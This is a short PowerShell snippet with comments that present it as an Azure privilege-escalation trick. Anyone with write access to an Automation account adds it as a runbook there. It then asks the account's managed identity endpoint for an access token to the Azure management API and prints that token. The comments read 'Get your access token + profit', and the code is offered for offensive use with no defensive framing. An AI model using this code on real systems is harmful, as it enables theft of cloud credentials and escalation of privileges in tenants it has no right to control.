// Have read/write access to an automation account? Does the said automation account contain a hot identity for privesc?
// Use the following code to create a new automation account runbook in Automation account containing managed identity.
// Get your access token + profit

$resource = "?resource=https://management.azure.com/" # Or the resource URL you need access to
$url = $env:IDENTITY_ENDPOINT + $resource
$Headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$Headers.Add("X-IDENTITY-HEADER", $env:IDENTITY_HEADER)
$Headers.Add("Metadata", "True")

Write-Output "Getting access token..."
$accessToken = Invoke-RestMethod -Uri $url -Method 'GET' -Headers $Headers
Write-Output $accessToken.access_token
